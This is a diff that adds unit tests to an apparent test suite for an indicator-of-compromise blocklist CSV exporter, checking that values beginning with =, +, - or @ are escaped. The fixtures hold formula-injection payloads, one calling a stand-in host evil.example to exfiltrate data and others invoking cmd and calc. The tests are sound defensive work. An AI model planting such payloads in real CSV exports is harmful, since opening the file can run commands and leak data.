@@ -211,6 +211,30 @@ describe("buildIocBlocklistCsv", () => {
     const csv = buildIocBlocklistCsv(state);
     expect(csv.trim()).toBe("type,value,severity,verdict,description");
   });
+
+  it("guards CSV injection: a value starting with = is prefixed with a single quote", () => {
+    const state = emptyState("c1");
+    state.iocs = [
+      ioc({ id: "i1", type: "url", value: "=cmd|http://evil.example/exfil!A1", enrichments: [enrich("malicious")] }),
+    ];
+    const csv = buildIocBlocklistCsv(state, { minSeverity: "Low" });
+    // The leading = must be neutralized so Excel/LibreOffice don't run it as a formula.
+    expect(csv).toContain("'=cmd|http://evil.example/exfil!A1");
+    expect(csv).not.toMatch(/,=cmd\|/); // never a bare = after a comma
+  });
+
+  it("guards CSV injection: values starting with + - @ are also neutralized", () => {
+    const state = emptyState("c1");
+    state.iocs = [
+      ioc({ id: "i1", type: "domain", value: "+1+1|cmd", enrichments: [enrich("suspicious")] }),
+      ioc({ id: "i2", type: "domain", value: "@SUM(A1)", enrichments: [enrich("suspicious")] }),
+      ioc({ id: "i3", type: "domain", value: "-2+3|calc", enrichments: [enrich("suspicious")] }),
+    ];
+    const csv = buildIocBlocklistCsv(state, { minSeverity: "Low" });
+    expect(csv).toContain("'+1+1|cmd");
+    expect(csv).toContain("'@SUM(A1)");
+    expect(csv).toContain("'-2+3|calc");
+  });
 });
 
 // ── buildIocBlocklistStix ────────────────────────────────────────────────────
